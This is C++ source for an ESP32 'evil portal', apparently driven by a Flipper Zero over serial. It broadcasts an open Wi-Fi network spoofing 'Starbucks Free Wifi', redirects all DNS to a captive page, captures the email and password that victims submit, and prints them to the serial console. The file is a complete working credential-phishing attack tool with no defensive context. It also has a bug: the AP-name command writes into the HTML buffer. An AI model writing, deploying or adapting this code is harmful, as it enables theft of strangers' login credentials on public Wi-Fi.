#include <ESPAsyncWebServer.h>

#include <DNSServer.h>
#include <AsyncTCP.h>
#include <WiFi.h>

#define MAX_HTML_SIZE 7000

#define SET_HTML_CMD "sethtml="
#define SET_AP_CMD "setap="
#define RESET_CMD "reset"
#define START_CMD "start"
#define ACK_CMD "ack"

// GLOBALS
DNSServer dnsServer;
AsyncWebServer server(80);

bool runServer = false;

String user_name;
String password;
bool name_received = false;
bool password_received = false;

char apName[30] = "Starbucks Free Wifi";
char index_html[MAX_HTML_SIZE]; // Non-const char array to hold the HTML

// RESET
//void (*resetFunction)(void) = 0;

// Function to perform a simulated reset
void performReset() {
  Serial.println("Simulated reset...");
  // Add your reset code here (e.g., reset the device, restart the program, etc.)
}

// Function to check for a specific command and perform actions accordingly
void handleCommands() {
  if (checkForCommand(RESET_CMD)) {
    Serial.println("Reset command received.");
    performReset(); // Call the reset function
  }
}

// AP FUNCTIONS
class CaptiveRequestHandler : public AsyncWebHandler {
public:
  CaptiveRequestHandler() {}
  virtual ~CaptiveRequestHandler() {}

  bool canHandle(AsyncWebServerRequest *request) { return true; }

  void handleRequest(AsyncWebServerRequest *request) {
    // Send index_html from flash memory
    request->send_P(200, "text/html", index_html);
  }
};

void setupServer() {  
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", index_html);
    Serial.println("client connected");
  });

  server.on("/get", HTTP_GET, [](AsyncWebServerRequest *request) {
    String inputMessage;
    String inputParam;

    if (request->hasParam("email")) {
      inputMessage = request->getParam("email")->value();
      inputParam = "email";
      user_name = inputMessage;
      name_received = true;
    }

    if (request->hasParam("password")) {
      inputMessage = request->getParam("password")->value();
      inputParam = "password";
      password = inputMessage;
      password_received = true;
    }
    request->send(
        200, "text/html",
        "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
  });
  Serial.println("web server up");
}

void startAP() {
  Serial.print("starting ap ");
  Serial.println(apName);

  WiFi.mode(WIFI_AP);
  WiFi.softAP(apName);

  Serial.print("ap ip address: ");
  Serial.println(WiFi.softAPIP());

  setupServer();

  dnsServer.start(53, "*", WiFi.softAPIP());
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
  server.begin();
}

bool checkForCommand(const char *command) {
  static char receivedCommand[50];
  static int commandIndex = 0;

  while (Serial.available() > 0) {
    char incomingChar = Serial.read();

    if (incomingChar == '\n') {
      // Null-terminate the received command string
      receivedCommand[commandIndex] = '\0';

      // Compare the received command with the desired command
      if (strcmp(receivedCommand, command) == 0) {
        // Reset the command buffer and index
        receivedCommand[0] = '\0';
        commandIndex = 0;
        return true;
      } else {
        // Command doesn't match, reset the buffer and index
        receivedCommand[0] = '\0';
        commandIndex = 0;
        return false;
      }
    } else {
      // Add the incoming character to the command buffer
      receivedCommand[commandIndex] = incomingChar;
      commandIndex = (commandIndex + 1) % 49; // Avoid buffer overflow
    }
  }

  return false;
}

void getInitInput(char* buffer) {
  // wait for html
  Serial.println("Waiting for HTML");
  bool has_ap = false;
  bool has_html = false;
  while (!has_html || !has_ap) {
    if (Serial.available() > 0) {
      String flipperMessage = Serial.readString();
      const char *serialMessage = flipperMessage.c_str();
      if (strncmp(serialMessage, SET_HTML_CMD, strlen(SET_HTML_CMD)) == 0) {
        serialMessage += strlen(SET_HTML_CMD);
        strcpy_P(buffer, serialMessage); // Use strcpy_P to copy from PROGMEM
        has_html = true;
        Serial.println("html set");
      } else if (strncmp(serialMessage, SET_AP_CMD, strlen(SET_AP_CMD)) == 0) {
        serialMessage += strlen(SET_AP_CMD);
        strncpy(buffer, serialMessage, strlen(serialMessage) - 1);
        has_ap = true;
        Serial.println("ap set");
      } else if (strncmp(serialMessage, RESET_CMD, strlen(RESET_CMD)) == 0) {
        performReset();
      }
    }
  }
  Serial.println("all set");
}

void startPortal() {
  // wait for flipper input to get config index
  startAP();
  runServer = true;
}

// MAIN FUNCTIONS
void setup() {
  Serial.begin(115200);
  getInitInput(index_html); // Pass the non-const index_html buffer to getInitInput
  startPortal();
}

void loop() {
  dnsServer.processNextRequest();
  if (name_received && password_received) {
    name_received = false;
    password_received = false;
    String logValue1 =
        "u: " + user_name;
    String logValue2 = "p: " + password;
    Serial.println(logValue1);
    Serial.println(logValue2);
  }
  handleCommands(); // Check for specific commands and perform actions
}
